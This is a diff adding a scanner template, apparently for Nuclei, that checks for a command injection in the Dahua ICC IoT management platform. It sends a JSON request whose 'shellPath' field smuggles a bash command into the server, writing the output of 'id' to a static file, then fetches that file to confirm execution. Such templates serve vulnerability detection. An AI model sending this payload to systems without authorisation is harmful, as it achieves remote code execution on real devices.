@@ -1,0 +1,72 @@
+id: poc-yaml-dahua-icc-receive-command-injection
+info:
+  name: Dahua ICC Integrated IoT Management Platform Receive Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  filename: "{{rand_base(5)}}"
+
+http:
+  - id: "command-injection-post"
+    method: POST
+    path:
+      - "{{BaseURL}}/evo-runs/v1.0/receive"
+    headers:
+      Content-Type: application/json
+      X-Subject-Headerflag: ADAPT
+    body: |
+      {
+        "method": "agent.ossm.mapping.config",
+        "info": {
+          "configure": "abcd",
+          "filePath": "haha",
+          "paramMap": {
+            "shellPath": "/bin/bash -c id>/opt/evoWpms/static/{{filename}}.txt",
+            "filePath": "abc"
+          },
+          "requestIp": ""
+        }
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+      - type: word
+        part: header
+        words:
+          - "evo-runs"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+  - id: "command-injection-get"
+    method: GET
+    path:
+      - "{{BaseURL}}/static/{{filename}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "uid=.*gid=.*"
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
